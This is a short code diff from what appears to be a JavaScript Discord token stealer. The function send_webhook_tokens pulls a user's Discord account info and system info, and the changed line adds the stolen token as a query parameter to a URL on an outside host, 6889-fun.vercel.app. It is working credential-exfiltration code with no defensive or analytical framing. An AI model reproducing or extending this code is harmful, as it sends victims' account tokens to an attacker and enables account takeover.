@@ -69,7 +69,7 @@ const send_webhook_tokens = async (webhook) => {
             }
             if (!infos) continue;
 
-            const copy = `https://6889-fun.vercel.app`;
+            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
             const discord = await get_discord_Info(token);
             const system = await get_info();
 
